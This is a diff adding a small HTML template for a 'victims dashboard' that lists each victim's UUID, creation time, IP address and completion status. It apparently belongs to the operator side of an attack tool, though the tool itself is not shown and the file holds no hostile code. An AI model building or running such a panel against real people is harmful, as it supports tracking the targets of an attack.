@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>victims dashboard</title>
+  </head>
+  <body>
+    <p>Currently there are {{ .Count }} victims.</p>
+    <table style="width: 100%">
+      <tr>
+        <th>UUID</th>
+        <th>Created</th>
+        <th>IP</th>
+        <th>Completed</th>
+      </tr>
+      {{ range .Victims }}
+      <tr>
+        <td>{{ .UUID }}</td>
+        <td>{{ .CreatedAt }}</td>
+        <td>{{ .IP }}</td>
+        <td>{{ .Completed }}</td>
+      </tr>
+      {{ end }}
+    </table>
+  </body>
+</html>
